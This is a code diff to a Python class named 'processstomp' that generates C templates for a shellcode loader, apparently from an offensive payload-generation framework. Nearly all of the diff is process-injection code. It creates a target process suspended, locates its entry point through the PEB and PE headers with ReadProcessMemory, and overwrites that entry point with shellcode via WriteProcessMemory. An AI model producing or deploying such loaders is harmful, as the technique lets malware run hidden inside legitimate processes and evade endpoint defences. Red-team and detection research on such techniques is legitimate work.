@@ -9,8 +9,7 @@ class processstomp:
     def imports(self) -> list[str]:
         return ["#include <windows.h>", 
                 "#include <stdio.h>", 
-                "#include <stdlib.h>", 
-                "#include <winternl.h>"]
+                '#include "spawnandinject.h"']
 
     def compilerOptions(self) -> list[str]:
         return []
@@ -27,51 +26,26 @@ class processstomp:
     }}; 
     PROCESS_INFORMATION pi; 
 
-    PPEB pPeb;
-    PVOID pImage, pEntry;
-    PIMAGE_NT_HEADERS pNtHeaders;
-    LONG e_lfanew;
-    SIZE_T NumberOfBytesRead;
-    DWORD AddressOfEntryPoint;
-
     {CreateProcessA}(NULL, (LPSTR) "$target", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
 
-    NTSTATUS status;
     PROCESS_BASIC_INFORMATION pbi;
 
     memset(&pbi, 0, sizeof(pbi));
 
-    status = {NtQueryInformationProcess}(
-    pi.hProcess,
-    ProcessBasicInformation,
-    &pbi,
-    sizeof(pbi),
-    NULL);
+    {NtQueryInformationProcess}(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), NULL);
 
-    pPeb = pbi.PebBaseAddress;
+    PPEB pPeb = pbi.PebBaseAddress;
 
-    {ReadProcessMemory}(
-        pi.hProcess,
-        &pPeb->Reserved3[1],
-        &pImage,
-        sizeof(pImage),
-        &NumberOfBytesRead);
-        
-    {ReadProcessMemory}(
-        pi.hProcess,
-        (PCHAR)pImage + offsetof(IMAGE_DOS_HEADER, e_lfanew),
-        &e_lfanew,
-        sizeof(e_lfanew),
-        &NumberOfBytesRead);
-    pNtHeaders = (PIMAGE_NT_HEADERS)((PCHAR)pImage + e_lfanew);
-
-    {ReadProcessMemory}(
-        pi.hProcess,
-        (PCHAR)pNtHeaders + offsetof(IMAGE_NT_HEADERS, OptionalHeader.AddressOfEntryPoint),
-        &AddressOfEntryPoint,
-        sizeof(AddressOfEntryPoint),
-        &NumberOfBytesRead);
-    pEntry = (PVOID)((PCHAR)pImage + AddressOfEntryPoint);
+    PVOID pImage;
+    SIZE_T NumberOfBytesRead;
+    {ReadProcessMemory}(pi.hProcess, &pPeb->ImageBaseAddress, &pImage, sizeof(pImage), &NumberOfBytesRead);    
+    LONG e_lfanew;  
+    {ReadProcessMemory}(pi.hProcess, (PCHAR)pImage + offsetof(IMAGE_DOS_HEADER, e_lfanew), &e_lfanew, sizeof(e_lfanew), &NumberOfBytesRead);
+    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((PCHAR)pImage + e_lfanew);
+    
+    DWORD AddressOfEntryPoint;
+    {ReadProcessMemory}(pi.hProcess, (PCHAR)pNtHeaders + offsetof(IMAGE_NT_HEADERS, OptionalHeader.AddressOfEntryPoint), &AddressOfEntryPoint, sizeof(AddressOfEntryPoint), &NumberOfBytesRead);
+    PVOID pEntry = (PVOID)((PCHAR)pImage + AddressOfEntryPoint);
     
     {WriteProcessMemory}(pi.hProcess, pEntry, shellcode, {shellcodeSize}, NULL);
 
